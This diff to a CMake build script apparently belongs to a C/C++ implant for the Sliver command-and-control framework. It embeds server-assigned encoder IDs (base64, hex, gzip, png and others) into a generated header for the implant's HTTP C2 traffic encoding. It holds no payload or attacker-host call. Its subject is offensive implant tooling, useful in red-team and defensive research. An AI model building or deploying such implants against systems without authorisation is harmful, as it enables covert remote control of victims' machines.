@@ -159,6 +159,26 @@ if(DEBUG_LOG)
   set(_debug 1)
 endif()
 
+# Encoder ids: assigned per server database (server/encoders EncoderMap), so an
+# HTTP(S) build embeds them to reproduce encoders.EncoderFromNonce.
+set(SLIVER_ENCODER_ID_BASE64   0)
+set(SLIVER_ENCODER_ID_BASE58   0)
+set(SLIVER_ENCODER_ID_BASE32   0)
+set(SLIVER_ENCODER_ID_HEX      0)
+set(SLIVER_ENCODER_ID_ENGLISH  0)
+set(SLIVER_ENCODER_ID_GZIP     0)
+set(SLIVER_ENCODER_ID_PNG      0)
+string(JSON _enc_type ERROR_VARIABLE _enc_err TYPE "${_json}" encoders)
+if(NOT _enc_err AND NOT _enc_type STREQUAL "NULL")
+  _cfg_get_n(SLIVER_ENCODER_ID_BASE64   encoders base64  "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_BASE58   encoders base58  "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_BASE32   encoders base32  "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_HEX      encoders hex     "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_ENGLISH  encoders english "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_GZIP     encoders gzip    "0")
+  _cfg_get_n(SLIVER_ENCODER_ID_PNG      encoders png     "0")
+endif()
+
 # ---------------------------------------------------------------------------
 # HTTP(S) C2 profile. The server always writes the "http" object (see
 # server/cppbuild/config.go buildHTTPProfile), but a build may legitimately have
@@ -296,6 +316,15 @@ file(WRITE "${OUT_DIR}/implant_build_config.h"
 #define SLIVER_LIMIT_LOCALE      \"${_lim_loc}\"
 
 #define SLIVER_DEBUG_LOG ${_debug}
+
+/* Encoder ids for the HTTP C2 nonce -> encoder mapping (0 = not embedded). */
+#define SLIVER_ENCODER_ID_BASE64   ${SLIVER_ENCODER_ID_BASE64}
+#define SLIVER_ENCODER_ID_BASE58   ${SLIVER_ENCODER_ID_BASE58}
+#define SLIVER_ENCODER_ID_BASE32   ${SLIVER_ENCODER_ID_BASE32}
+#define SLIVER_ENCODER_ID_HEX      ${SLIVER_ENCODER_ID_HEX}
+#define SLIVER_ENCODER_ID_ENGLISH  ${SLIVER_ENCODER_ID_ENGLISH}
+#define SLIVER_ENCODER_ID_GZIP     ${SLIVER_ENCODER_ID_GZIP}
+#define SLIVER_ENCODER_ID_PNG      ${SLIVER_ENCODER_ID_PNG}
 
 /* HTTP(S) C2 profile (see sliver/config.h). Arrays live in implant_http_c2.c. */
 #define SLIVER_HTTP_C2_PRESENT       ${SLIVER_HTTP_PRESENT}
